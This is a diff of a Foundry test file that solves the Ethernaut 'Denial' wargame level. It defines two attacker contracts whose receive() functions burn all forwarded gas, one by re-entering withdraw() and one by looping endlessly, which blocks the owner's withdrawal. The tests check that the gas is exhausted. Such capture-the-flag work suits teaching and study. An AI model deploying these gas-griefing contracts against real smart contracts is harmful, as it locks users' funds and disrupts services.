@@ -4,38 +4,51 @@ pragma solidity ^0.8.0;
 import "forge-std/Test.sol";
 import "src/openzeppelin-ethernaut/Denial.sol";
 
+// infinite loop
 contract MiddleMan {
-    Denial denial;
-
-    constructor(address payable prey) {
-        denial = Denial(prey);
-    }
-
-    function register() public {
-        denial.setWithdrawPartner(address(this));
-    }
-
     receive() external payable {
-        denial.withdraw();
+        Denial(payable(msg.sender)).withdraw();
     }
 }
 
+// type(uint256).max > 1m
+contract MiddleMan2 {
+    receive() external payable {
+        for (uint256 i; i < type(uint256).max; i++) {
+            i;
+        }
+    }
+}
+
+// since there's a gas limit, make sure the gas is exhausted at the partner.call() line
 contract DenialTest is Test {
-    Denial instance = Denial(payable(vm.envAddress("DENIAL")));
+    // Denial instance = Denial(payable(vm.envAddress("DENIAL")));
+    Denial instance;
+    uint256 GAS_LIMIT = 1_000_000;
 
-    function test() public {
-        uint256 balance = address(instance).balance;
-        // vm.deal(address(instance), 100 ether);
-        console.log("balance", balance);
+    function setUp() public {
+        instance = new Denial();
+    }
 
-        MiddleMan middleMan = MiddleMan(payable(vm.envAddress("DENIAL_MIDDLEMAN")));
-        middleMan.register();
+    function test_infinite_loop() public {
+        MiddleMan middleMan = new MiddleMan();
+        instance.setWithdrawPartner(address(middleMan));
 
-        vm.startPrank(address(0xA9E));
-        vm.expectRevert();
-        instance.withdraw{gas: 1000000}();
+        uint256 startGas = gasleft();
+        vm.prank(instance.owner());
+        instance.withdraw();
 
-        // assertEq(instance.contractBalance(), 100 ether);
-        assertEq(address(instance).balance, balance);
+        assertTrue(startGas - gasleft() > GAS_LIMIT);
+    }
+
+    function test_uint256_max() public {
+        MiddleMan2 middleMan = new MiddleMan2();
+        instance.setWithdrawPartner(address(middleMan));
+
+        uint256 startGas = gasleft();
+        vm.prank(instance.owner());
+        instance.withdraw();
+
+        assertTrue(startGas - gasleft() > GAS_LIMIT);
     }
 }
